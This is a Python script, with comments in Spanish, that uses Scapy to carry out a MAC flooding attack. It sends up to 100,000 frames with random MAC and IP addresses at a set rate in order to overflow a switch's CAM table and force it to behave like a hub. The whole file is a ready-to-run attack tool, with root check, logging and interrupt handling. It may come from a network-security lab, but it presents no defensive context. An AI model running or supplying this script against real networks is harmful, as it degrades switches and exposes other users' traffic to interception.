#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║                       MAC FLOODING                                  ║
║       Saturando la tabla CAM del switch (Hub Mode)                  ║
║                                                                     ║
╚══════════════════════════════════════════════════════╝
Uso: sudo python3 mac_flood.py
"""

from scapy.all import *
import random
import time
import sys
import os
import signal

# ─────────────────────────────────────────────
#  CONFIGURACIÓN
# ─────────────────────────────────────────────
IFACE = "ens3"  # Interfaz de red del atacante
PACKET_RATE = 10000  # Paquetes por segundo
PACKET_COUNT = 100000  # Total de paquetes a enviar

conf.iface = IFACE

# Estado global
flood_activa = True
contador_paquetes = 0

# ─────────────────────────────────────────────
#  UTILIDADES
# ─────────────────────────────────────────────

def log(tag, msg):
    tags = {
        "FLOOD": "\033[33m",
        "INFO": "\033[37m",
        "ERR": "\033[31m",
    }
    c = tags.get(tag, "\033[0m")
    reset = "\033[0m"
    ts = time.strftime("%H:%M:%S")
    print(f"{c}[{ts}][{tag}]{reset} {msg}")

def banner():
    print("""\033[31m
╔══════════════════════════════════════════════════════╗
║              MAC FLOODING                                           ║
║       Saturando la tabla CAM del switch (Hub Mode)                  ║
╚══════════════════════════════════════════════════════╝\033[0m
""")

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )

# ─────────────────────────────────────────────
#  ATAQUE MAC FLOODING
# ─────────────────────────────────────────────

def build_flood_packet():
    src_mac = random_mac()
    dst_mac = random_mac()
    # Creamos un paquete IP/TCP para que sea más "real" y el switch lo procese
    packet = (
        Ether(src=src_mac, dst=dst_mac) /
        IP(src="192.168.1.%d" % random.randint(2, 254), 
            dst="192.168.1.%d" % random.randint(2, 254)) /
        TCP(sport=random.randint(1024, 65535), dport=random.randint(1, 100))
    )
    return packet

def hilo_flood():
    global contador_paquetes
    log("INFO", f"Iniciando MAC Flooding en {IFACE}")
    log("INFO", f"Tasa objetivo: {PACKET_RATE} paquetes/segundo")
    
    start_time = time.time()
    sleep_time = 1.0 / PACKET_RATE
    
    while flood_activa and contador_paquetes < PACKET_COUNT:
        try:
            sendp(build_flood_packet(), iface=IFACE, verbose=0)
            contador_paquetes += 1
            
            if contador_paquetes % 5000 == 0:
                elapsed = time.time() - start_time
                current_rate = contador_paquetes / elapsed
                log("FLOOD", f"Enviados {contador_paquetes} paquetes. Tasa actual: {current_rate:.0f} pps")
            
            time.sleep(sleep_time)
        except Exception as e:
            log("ERR", f"Flood: {e}")
            time.sleep(0.1)
    
    elapsed = time.time() - start_time
    log("INFO", f"Ataque completado. Se enviaron {contador_paquetes} paquetes en {elapsed:.2f}s")

# ─────────────────────────────────────────────
#  CONTROL Y ARRANQUE
# ─────────────────────────────────────────────

def verificar_root():
    if os.geteuid() != 0:
        print("\033[31m[!] Ejecutar como root: sudo python3 mac_flood.py\033[0m")
        sys.exit(1)

def signal_handler(sig, frame):
    global flood_activa
    print("\n\033[33m[!] Deteniendo ataque...\033[0m")
    flood_activa = False
    time.sleep(1)
    log("INFO", f"Se enviaron {contador_paquetes} paquetes en total")
    sys.exit(0)

def main():
    verificar_root()
    banner()
    log("INFO", f"Interfaz: {IFACE}")
    log("INFO", f"Paquetes totales: {PACKET_COUNT}")
    print()

    signal.signal(signal.SIGINT, signal_handler)
    hilo_flood()

if __name__ == "__main__":
    main()